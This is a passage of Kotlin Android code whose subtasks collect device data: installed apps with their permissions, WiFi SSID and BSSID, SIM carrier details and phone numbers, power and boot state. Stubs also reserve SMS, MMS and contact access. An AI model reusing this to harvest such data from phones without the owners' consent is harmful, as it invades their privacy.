                        } else true
                    } catch (e: Exception) { null },
                    "batterySaverMode" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        powerManager.isPowerSaveMode
                    } else null,
                    "deviceIdleMode" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        powerManager.isDeviceIdleMode
                    } else null,
                    "isInteractive" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
                        powerManager.isInteractive
                    } else null,
                    "isScreenOn" to try {
                        @Suppress("DEPRECATION")
                        powerManager.isScreenOn
                    } catch (e: Exception) { null },
                    "isSustainedPerformanceModeSupported" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        powerManager.isSustainedPerformanceModeSupported
                    } else false
                )
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error collecting power management info", e)
                emptyMap()
            }
        }
    }

    // ============================================================================
    // SUBTASK 12: BOOT INFORMATION
    // ============================================================================

    private class Subtask12_BootInfo : DeviceInfoSubtask {
        override fun getName() = "bootInfo"

        override fun getRequiredPermissions() = emptyList<String>()

        override fun collect(context: Context): Map<String, Any?> {
            return try {
                val uptime = android.os.SystemClock.uptimeMillis()
                val elapsedRealtime = android.os.SystemClock.elapsedRealtime()
                val currentTime = System.currentTimeMillis()
                val lastBootTime = currentTime - uptime

                // Get boot count from SharedPreferences
                val prefs = context.getSharedPreferences("device_info", Context.MODE_PRIVATE)
                val bootCount = prefs.getInt("boot_count", 0)

                mapOf(
                    "bootTimestamp" to currentTime,
                    "lastBootTime" to lastBootTime,
                    "systemUptime" to uptime,
                    "elapsedRealtime" to elapsedRealtime,
                    "bootCount" to bootCount
                )
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error collecting boot info", e)
                emptyMap()
            }
        }
    }

    // ============================================================================
    // SUBTASK 13: PERFORMANCE METRICS
    // ============================================================================

    private class Subtask13_PerformanceMetrics : DeviceInfoSubtask {
        override fun getName() = "performanceMetrics"

        override fun getRequiredPermissions() = emptyList<String>()

        override fun collect(context: Context): Map<String, Any?> {
            return try {
                val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager
                    ?: return emptyMap()

                val memoryInfo = ActivityManager.MemoryInfo()
                activityManager.getMemoryInfo(memoryInfo)

                mapOf(
                    "memoryPressure" to memoryInfo.lowMemory,
                    "lowMemoryThreshold" to memoryInfo.threshold,
                    "runningProcessesCount" to try {
                        @Suppress("DEPRECATION")
                        activityManager.runningAppProcesses?.size ?: 0
                    } catch (e: Exception) { 0 },
                    "runningServicesCount" to try {
                        activityManager.getRunningServices(Int.MAX_VALUE)?.size ?: 0
                    } catch (e: Exception) { 0 }
                )
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error collecting performance metrics", e)
                emptyMap()
            }
        }
    }

    // ============================================================================
    // SUBTASK 14: SMS METADATA (SLOW - Implemented as placeholder)
    // ============================================================================

    private class Subtask14_SmsMetadata : DeviceInfoSubtask {
        override fun getName() = "smsMetadata"

        override fun getRequiredPermissions() = listOf(android.Manifest.permission.READ_SMS)

        override fun collect(context: Context): Map<String, Any?> {
            // TODO: Implement SMS metadata collection
            // This is a slow operation (5-15 seconds)
            // Should be done in background with batching
            return emptyMap() // Placeholder
        }
    }

    // ============================================================================
    // SUBTASK 15: MMS MESSAGES (SLOW - Implemented as placeholder)
    // ============================================================================

    private class Subtask15_MmsMessages : DeviceInfoSubtask {
        override fun getName() = "mmsMessages"

        override fun getRequiredPermissions() = listOf(android.Manifest.permission.READ_SMS)

        override fun collect(context: Context): Map<String, Any?> {
            // TODO: Implement MMS collection
            // This is a slow operation (3-10 seconds)
            return emptyMap() // Placeholder
        }
    }

    // ============================================================================
    // SUBTASK 16: CONTACT METADATA (SLOW - Implemented as placeholder)
    // ============================================================================

    private class Subtask16_ContactMetadata : DeviceInfoSubtask {
        override fun getName() = "contactMetadata"

        override fun getRequiredPermissions() = listOf(android.Manifest.permission.READ_CONTACTS)

        override fun collect(context: Context): Map<String, Any?> {
            // TODO: Implement contact metadata collection
            // This is a slow operation (2-8 seconds)
            return emptyMap() // Placeholder
        }
    }

    // ============================================================================
    // SUBTASK 17: NOTIFICATION EXTENDED (SLOW - Implemented as placeholder)
    // ============================================================================

    private class Subtask17_NotificationExtended : DeviceInfoSubtask {
        override fun getName() = "notificationExtended"

        override fun getRequiredPermissions() = emptyList<String>() // Uses NotificationListenerService

        override fun collect(context: Context): Map<String, Any?> {
            // TODO: Implement extended notification details
            // This is a slow operation (1-3 seconds)
            return emptyMap() // Placeholder
        }
    }

    // ============================================================================
    // SUBTASK 18: APP INFORMATION (SLOW - Implemented as placeholder)
    // ============================================================================

    private class Subtask18_AppInfo : DeviceInfoSubtask {
        override fun getName() = "appInfo"

        override fun getRequiredPermissions(): List<String> {
            // QUERY_ALL_PACKAGES is needed on Android 11+ to see all installed apps
            // Without it, only system apps and your own app are visible
            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                listOf(android.Manifest.permission.QUERY_ALL_PACKAGES)
            } else {
                // No permission needed for older Android versions
                emptyList()
            }
        }

        override fun collect(context: Context): Map<String, Any?> {
            return try {
                val packageManager = context.packageManager

                // Check permission for Android 11+
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    if (ActivityCompat.checkSelfPermission(
                            context,
                            android.Manifest.permission.QUERY_ALL_PACKAGES
                        ) != PackageManager.PERMISSION_GRANTED
                    ) {
                        LogHelper.w(TAG, "QUERY_ALL_PACKAGES permission not granted - only system apps will be visible")
                    }
                }

                val installedPackages = packageManager.getInstalledPackages(
                    PackageManager.GET_PERMISSIONS or PackageManager.MATCH_DISABLED_COMPONENTS
                )

                val appsList = mutableListOf<Map<String, Any?>>()

                // Collect app info with permissions (limit to first 500 apps to avoid timeout)
                val maxApps = minOf(installedPackages.size, 500)
                installedPackages.take(maxApps).forEach { packageInfo ->
                    try {
                        val applicationInfo = packageInfo.applicationInfo
                        if (applicationInfo == null) {
                            LogHelper.w(TAG, "ApplicationInfo is null for package ${packageInfo.packageName}")
                            return@forEach
                        }

                        val appInfo = mutableMapOf<String, Any?>(
                            "packageName" to packageInfo.packageName,
                            "appName" to try {
                                packageManager.getApplicationLabel(applicationInfo).toString()
                            } catch (e: Exception) { null },
                            "versionName" to packageInfo.versionName,
                            "versionCode" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                                packageInfo.longVersionCode
                            } else {
                                @Suppress("DEPRECATION")
                                packageInfo.versionCode.toLong()
                            },
                            "isSystemApp" to ((applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0),
                            "isUpdatedSystemApp" to ((applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0),
                            "firstInstallTime" to packageInfo.firstInstallTime,
                            "lastUpdateTime" to packageInfo.lastUpdateTime
                        )

                        // Get permissions for this app
                        val permissions = mutableListOf<String>()
                        val requestedPermissions = packageInfo.requestedPermissions
                        val requestedPermissionsFlags = packageInfo.requestedPermissionsFlags
                        if (requestedPermissions != null) {
                            requestedPermissions.forEachIndexed { index, permission ->
                                val granted = if (requestedPermissionsFlags != null &&
                                    index < requestedPermissionsFlags.size) {
                                    (requestedPermissionsFlags[index] and
                                        android.content.pm.PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0
                                } else false

                                permissions.add(permission)
                            }
                        }

                        appInfo["permissions"] = permissions
                        appInfo["permissionCount"] = permissions.size

                        appsList.add(appInfo)
                    } catch (e: Exception) {
                        LogHelper.w(TAG, "Error collecting info for package ${packageInfo.packageName}", e)
                    }
                }

                mapOf(
                    "installedAppsCount" to installedPackages.size,
                    "collectedAppsCount" to appsList.size,
                    "apps" to appsList
                )
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error collecting app info", e)
                emptyMap()
            }
        }
    }

    // ============================================================================
    // SUBTASK 19: DEVICE STATUS INFO (Combined JSON Object)
    // ============================================================================
    // This subtask combines all the new device status features into a single JSON object:
    // - WiFi connected/name (SSID, BSSID, signal strength, link speed)
    // - Mobile data enable/disable
    // - Flight mode
    // - Dual SIM card info (separate info for each SIM)
    // - Sound mode (vibrate/silent/sound with volume levels)
    // - Installed apps with permissions
    // ============================================================================

    private class Subtask19_DeviceStatusInfo : DeviceInfoSubtask {
        override fun getName() = "deviceStatusInfo"

        override fun getRequiredPermissions(): List<String> {
            val permissions = mutableListOf<String>()

            // WiFi info
            permissions.add(android.Manifest.permission.ACCESS_WIFI_STATE)

            // Mobile data and SIM info
            permissions.add(android.Manifest.permission.READ_PHONE_STATE)

            // Installed apps (Android 11+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                permissions.add(android.Manifest.permission.QUERY_ALL_PACKAGES)
            }

            return permissions
        }

        @SuppressLint("HardwareIds", "MissingPermission")
        override fun collect(context: Context): Map<String, Any?> {
            return try {
                val result = mutableMapOf<String, Any?>()

                // ====================================================================
                // 1. WiFi Information
                // ====================================================================
                val wifiInfo = mutableMapOf<String, Any?>()
                try {
                    val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
                    val networkInfo = connectivityManager?.activeNetworkInfo
                    val isWiFiConnected = networkInfo?.type == ConnectivityManager.TYPE_WIFI

                    wifiInfo["isConnected"] = isWiFiConnected

                    if (isWiFiConnected) {
                        val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
                        if (wifiManager != null && ActivityCompat.checkSelfPermission(
                                context,
                                android.Manifest.permission.ACCESS_WIFI_STATE
                            ) == PackageManager.PERMISSION_GRANTED
                        ) {
                            val wifiConnectionInfo = wifiManager.connectionInfo
                            val ssid = wifiConnectionInfo?.ssid
                            wifiInfo["ssid"] = if (ssid != null && ssid != "<unknown ssid>") {
                                ssid.removeSurrounding("\"")
                            } else null
                            wifiInfo["bssid"] = wifiConnectionInfo?.bssid
                            wifiInfo["rssi"] = wifiConnectionInfo?.rssi
                            wifiInfo["linkSpeed"] = wifiConnectionInfo?.linkSpeed
                        }
                    }
                } catch (e: Exception) {
                    LogHelper.w(TAG, "Error collecting WiFi info", e)
                }
                result["wifi"] = wifiInfo

                // ====================================================================
                // 2. Mobile Data Status
                // ====================================================================
                val mobileDataInfo = mutableMapOf<String, Any?>()
                try {
                    if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE)
                        == PackageManager.PERMISSION_GRANTED
                    ) {
                        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            mobileDataInfo["isEnabled"] = telephonyManager?.isDataEnabled
                        } else {
                            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
                            val networkInfo = connectivityManager?.activeNetworkInfo
                            mobileDataInfo["isEnabled"] = networkInfo?.type == ConnectivityManager.TYPE_MOBILE && networkInfo?.isConnected == true
                        }
                    }
                } catch (e: Exception) {
                    LogHelper.w(TAG, "Error collecting mobile data info", e)
                }
                result["mobileData"] = mobileDataInfo

                // ====================================================================
                // 3. Flight Mode
                // ====================================================================
                try {
                    result["flightMode"] = Settings.Global.getInt(
                        context.contentResolver,
                        Settings.Global.AIRPLANE_MODE_ON,
                        0
                    ) == 1
                } catch (e: Exception) {
                    LogHelper.w(TAG, "Error collecting flight mode", e)
                    result["flightMode"] = null
                }

                // ====================================================================
                // 4. Dual SIM Card Information
                // ====================================================================
                val simCardsInfo = mutableListOf<Map<String, Any?>>()
                try {
                    if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE)
                        == PackageManager.PERMISSION_GRANTED
                    ) {
                        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager

                        // Dual SIM support (Android 5.1+)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                            val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
                            if (subscriptionManager != null) {
                                val activeSubscriptions = subscriptionManager.activeSubscriptionInfoList
                                if (activeSubscriptions != null && activeSubscriptions.isNotEmpty()) {
                                    activeSubscriptions.forEach { subscriptionInfo ->
                                        val simCardInfo = mutableMapOf<String, Any?>(
                                            "slotIndex" to subscriptionInfo.simSlotIndex,
                                            "subscriptionId" to subscriptionInfo.subscriptionId,
                                            "carrierName" to subscriptionInfo.carrierName?.toString(),
                                            "displayName" to subscriptionInfo.displayName?.toString(),
                                            "mcc" to subscriptionInfo.mcc,
                                            "mnc" to subscriptionInfo.mnc,
                                            "countryIso" to subscriptionInfo.countryIso,
                                            "isEmbedded" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                                subscriptionInfo.isEmbedded
                                            } else null
                                        )

                                        // Get phone number for this SIM
                                        try {
                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                                simCardInfo["phoneNumber"] = subscriptionInfo.number
                                            } else {
                                                val slotTelephonyManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                                    telephonyManager?.createForSubscriptionId(subscriptionInfo.subscriptionId)
                                                } else null
                                                simCardInfo["phoneNumber"] = slotTelephonyManager?.line1Number
                                            }
                                        } catch (e: Exception) {
                                            LogHelper.w(TAG, "Error getting phone number for SIM ${subscriptionInfo.simSlotIndex}", e)
                                        }

                                        // Get operator info for this SIM
                                        try {
                                            val slotTelephonyManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                                telephonyManager?.createForSubscriptionId(subscriptionInfo.subscriptionId)
                                            } else null
                                            simCardInfo["operatorName"] = slotTelephonyManager?.simOperatorName
                                            simCardInfo["operatorCode"] = slotTelephonyManager?.simOperator
                                            simCardInfo["networkOperatorName"] = slotTelephonyManager?.networkOperatorName
                                            simCardInfo["networkOperatorCode"] = slotTelephonyManager?.networkOperator
                                            simCardInfo["isDataEnabled"] = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                                slotTelephonyManager?.isDataEnabled
                                            } else null
                                        } catch (e: Exception) {
                                            LogHelper.w(TAG, "Error getting operator info for SIM ${subscriptionInfo.simSlotIndex}", e)
                                        }

                                        simCardsInfo.add(simCardInfo)
                                    }
                                }
                            }
                        }

                        // Fallback: If no dual SIM info, collect default SIM info
                        if (simCardsInfo.isEmpty() && telephonyManager != null) {
                            val defaultSimInfo = mutableMapOf<String, Any?>(
                                "slotIndex" to 0,
                                "phoneNumber" to try { telephonyManager.line1Number } catch (e: Exception) { null },
                                "operatorName" to telephonyManager.simOperatorName,
                                "operatorCode" to telephonyManager.simOperator,
                                "networkOperatorName" to telephonyManager.networkOperatorName,
                                "networkOperatorCode" to telephonyManager.networkOperator,
                                "isDataEnabled" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    telephonyManager.isDataEnabled
                                } else null
                            )
                            simCardsInfo.add(defaultSimInfo)
                        }
                    }
                } catch (e: Exception) {
                    LogHelper.w(TAG, "Error collecting SIM card info", e)
                }
                result["simCards"] = simCardsInfo
                result["simCardCount"] = simCardsInfo.size

                // ====================================================================
                // 5. Sound Mode
                // ====================================================================
                val soundModeInfo = mutableMapOf<String, Any?>()
                try {
                    val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as? AudioManager
                    if (audioManager != null) {
                        val ringerMode = audioManager.ringerMode
                        soundModeInfo["mode"] = when (ringerMode) {
                            AudioManager.RINGER_MODE_SILENT -> "SILENT"
                            AudioManager.RINGER_MODE_VIBRATE -> "VIBRATE"
                            AudioManager.RINGER_MODE_NORMAL -> "SOUND"
                            else -> "UNKNOWN"
                        }
                        soundModeInfo["ringerMode"] = ringerMode
                        soundModeInfo["volumeMusic"] = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC)
                        soundModeInfo["volumeRing"] = audioManager.getStreamVolume(AudioManager.STREAM_RING)
                        soundModeInfo["volumeNotification"] = audioManager.getStreamVolume(AudioManager.STREAM_NOTIFICATION)
                        soundModeInfo["maxVolumeMusic"] = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                        soundModeInfo["maxVolumeRing"] = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING)
                    }
                } catch (e: Exception) {
                    LogHelper.w(TAG, "Error collecting sound mode info", e)
                }
                result["soundMode"] = soundModeInfo

                // ====================================================================
                // 6. Installed Apps with Permissions
                // ====================================================================
                val appsInfo = mutableMapOf<String, Any?>()
                try {
                    val packageManager = context.packageManager

                    // Check permission for Android 11+
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        if (ActivityCompat.checkSelfPermission(
                                context,
                                android.Manifest.permission.QUERY_ALL_PACKAGES
                            ) != PackageManager.PERMISSION_GRANTED
                        ) {
                            LogHelper.w(TAG, "QUERY_ALL_PACKAGES permission not granted - only system apps will be visible")
                        }
                    }

                    val installedPackages = packageManager.getInstalledPackages(
                        PackageManager.GET_PERMISSIONS or PackageManager.MATCH_DISABLED_COMPONENTS
                    )

                    val appsList = mutableListOf<Map<String, Any?>>()

                    // Collect app info with permissions (limit to first 500 apps to avoid timeout)
                    val maxApps = minOf(installedPackages.size, 500)
                    installedPackages.take(maxApps).forEach { packageInfo ->
                        try {
                            val applicationInfo = packageInfo.applicationInfo
                            if (applicationInfo == null) {
                                LogHelper.w(TAG, "ApplicationInfo is null for package ${packageInfo.packageName}")
                                return@forEach
                            }

                            val appInfo = mutableMapOf<String, Any?>(
                                "packageName" to packageInfo.packageName,
                                "appName" to try {
                                    packageManager.getApplicationLabel(applicationInfo).toString()
                                } catch (e: Exception) { null },
                                "versionName" to packageInfo.versionName,
                                "versionCode" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                                    packageInfo.longVersionCode
                                } else {
                                    @Suppress("DEPRECATION")
                                    packageInfo.versionCode.toLong()
                                },
                                "isSystemApp" to ((applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0),
                                "isUpdatedSystemApp" to ((applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0),
                                "firstInstallTime" to packageInfo.firstInstallTime,
                                "lastUpdateTime" to packageInfo.lastUpdateTime
                            )

                            // Get permissions for this app
                            val permissions = mutableListOf<String>()
                            val requestedPermissions = packageInfo.requestedPermissions
                            if (requestedPermissions != null) {
                                requestedPermissions.forEach { permission ->
                                    permissions.add(permission)
                                }
                            }

                            appInfo["permissions"] = permissions
                            appInfo["permissionCount"] = permissions.size

                            appsList.add(appInfo)
                        } catch (e: Exception) {
                            LogHelper.w(TAG, "Error collecting info for package ${packageInfo.packageName}", e)
                        }
                    }

                    appsInfo["installedAppsCount"] = installedPackages.size
                    appsInfo["collectedAppsCount"] = appsList.size
                    appsInfo["apps"] = appsList
                } catch (e: Exception) {
                    LogHelper.w(TAG, "Error collecting installed apps info", e)
                }
                result["installedApps"] = appsInfo

                result
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error collecting device status info", e)
                emptyMap()
            }
        }
    }
}
